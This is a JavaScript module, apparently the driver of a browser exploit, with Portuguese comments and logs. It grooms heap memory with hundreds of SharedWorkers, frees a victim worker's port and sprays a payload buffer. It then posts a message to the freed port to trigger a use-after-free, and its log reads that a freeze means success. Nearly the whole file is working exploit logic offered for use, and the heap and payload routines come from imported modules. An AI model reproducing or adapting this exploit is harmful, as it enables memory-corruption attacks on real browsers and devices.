import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_checkerboard_heap } from './heap.mjs';
import { build_universal_payload } from './payloads.mjs'; // NOME CORRIGIDO

var workers_stash = [];
var is_running = false;

export function init() {
    const btn = document.getElementById("btn_run");
    if(btn) btn.addEventListener("click", start_exploit);
    else console.error("Botão não encontrado!");
}

async function start_exploit() {
    if (is_running) return;
    if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
    
    is_running = true;
    log(">>> INICIANDO RAINBOW SPRAY (406) <<<", "warn");

    // 1. Payload 8KB (0x2000) - Padrão Lapse
    const PAYLOAD_SIZE = 0x2000;
    const payload = build_universal_payload(PAYLOAD_SIZE);
    
    // 2. Heap
    prepare_checkerboard_heap(PAYLOAD_SIZE);

    // 3. Grooming (0-400)
    log("Grooming inicial...");
    workers_stash = [];
    for(let i=0; i<400; i++) {
        try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
    }

    // 4. Trigger Loop
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 400;

    const interval = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval);
            trigger_uaf(payload);
            return;
        }

        try {
            let w = new SharedWorker("data:text/javascript,1", "v_"+p_count);
            w.port.start();
            workers_stash.push(w);
            // Log a cada 2 para não travar a UI
            if(p_count % 2 == 0) log(`Worker ${401+p_count} criado.`);
        } catch(e) {
            log("Erro alocação: " + e);
        }
        
        p_count++;
    }, 150);
}

function trigger_uaf(payload) {
    log("!!! ALVO 406: DISPARANDO !!!", "fail");
    
    // 1. Vítima
    const victim = workers_stash.pop();

    // 2. FREE
    victim.port.close();
    
    // 3. SPRAY
    log("Injetando Rainbow Payload...");
    const spray = [];
    for(let k=0; k<CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(new Uint32Array(payload));
    }

    // 4. TRIGGER
    try {
        victim.port.postMessage("PWN");
    } catch(e) {}

    log("Aguardando...");
    log("SE CONGELAR: SUCESSO.");
}
